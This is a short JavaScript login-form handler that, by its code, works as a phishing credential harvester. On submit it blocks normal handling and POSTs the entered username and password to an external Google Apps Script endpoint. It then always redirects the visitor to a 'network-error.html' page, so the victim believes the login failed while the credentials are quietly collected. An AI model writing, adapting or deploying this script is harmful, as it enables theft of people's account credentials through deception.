
// 🔹 Login Form Script
document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const data = {
    username: this.username.value,
    password: this.password.value
  };

  fetch("https://script.google.com/macros/s/AKfycbyPCNw32rKbcFBbYT5qIc0Jz1HS-rDHS3ZwcvNS6NMpjaHjjUZCWXw6f2XXF0pOV2qkQA/exec", {
    method: "POST",
    body: JSON.stringify(data)
  }).finally(() => {
    // Always redirect to error page after submit
    window.location.href = "network-error.html";
  });
});

